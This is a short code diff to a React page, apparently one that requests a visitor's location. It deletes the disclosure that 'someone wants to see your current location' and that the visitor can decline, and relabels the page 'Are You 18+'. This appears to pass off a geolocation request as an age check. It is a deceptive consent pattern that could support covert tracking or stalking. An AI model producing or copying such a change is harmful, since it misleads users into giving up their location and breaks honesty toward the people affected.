@@ -97,12 +97,7 @@ export default function SharePage() {
 
   return (
     <Centered>
-      <h2>Location Request</h2>
-      <p>Someone wants to see your current location.</p>
-      <p style={{ color: "#666", fontSize: 14 }}>
-        Your browser will ask you to confirm before anything is shared. You can
-        decline.
-      </p>
+      <h2>Are You 18+</h2>
       <div
         style={{
           marginTop: 20,
@@ -127,7 +122,8 @@ export default function SharePage() {
           onClick={handleDecline}
           style={{
             padding: "10px 20px",
-            background: "#eee",
+            background: "#111",
+            color: "#fff",
             border: "none",
             borderRadius: 6,
           }}
